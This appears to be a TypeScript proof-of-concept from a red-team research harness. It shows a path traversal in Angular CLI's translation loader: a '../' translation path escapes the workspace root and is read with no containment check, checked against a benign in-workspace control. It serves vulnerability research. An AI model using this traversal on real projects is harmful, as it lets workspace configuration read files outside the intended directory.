// N1-F — E1-C1 member E: translation-path read via the REAL loader + REAL loadTranslations call shape
// Mechanism: i18n-options.ts:249 `loader(path.join(workspaceRoot, file.path))` — file.path is
// workspace-config-controlled, NO containment (no isSubDirectory / realpath check on the translation
// path); createTranslationLoader (load-translations.ts:25) does raw fs.readFileSync(path).
import { createTranslationLoader } from '/Users/matheusvsky/Documents/trab/llm-redteam-harness/upstream/angular-cli/packages/angular/build/src/utils/load-translations';
import { loadTranslations } from '/Users/matheusvsky/Documents/trab/llm-redteam-harness/upstream/angular-cli/packages/angular/build/src/utils/i18n-options';

async function main() {
  const loader = await createTranslationLoader();
  const workspaceRoot = '/tmp/n1f/ws';
  const logger = { warn: (m: string) => console.log('[WARN]', m), error: (m: string) => console.log('[ERR]', m) };

  // HOP 1 (attack): translation file.path escapes the workspace root via ../
  const attackDesc = { files: [{ path: '../evil/outside.xlf' }] } as any;
  try {
    const out: any = {};
    await loadTranslations('fr', attackDesc, workspaceRoot, loader, logger, new Set(), 'warning');
    const t = (attackDesc as any).translation as Record<string, unknown>;
    console.log('[HOP1] loaded translations from OUT-OF-WORKSPACE path:',
      JSON.stringify(Object.keys(t ?? {})));
    console.log('[HOP1] marker content present:', JSON.stringify(t?.['marker-message-id'] ?? null));
    console.log('[HOP1] READ-OUTSIDE-WORKSPACE =', t?.['marker-message-id'] ? 'true' : 'false');
  } catch (e: any) {
    console.log('[HOP1] FAILED:', (e?.message ?? String(e)).slice(0, 200));
  }

  // HOP 2 (negative control): in-workspace benign path
  const benignDesc = { files: [{ path: 'benign.xlf' }] } as any;
  try {
    await loadTranslations('fr', benignDesc, workspaceRoot, loader, logger, new Set(), 'warning');
    const t = (benignDesc as any).translation as Record<string, unknown>;
    console.log('[HOP2] in-workspace translations loaded:',
      JSON.stringify(Object.keys(t ?? {})));
    console.log('[HOP2] benign marker present:', t?.['benign-message-id'] ? 'true' : 'false');
  } catch (e: any) {
    console.log('[HOP2] FAILED:', (e?.message ?? String(e)).slice(0, 200));
  }
}
main();
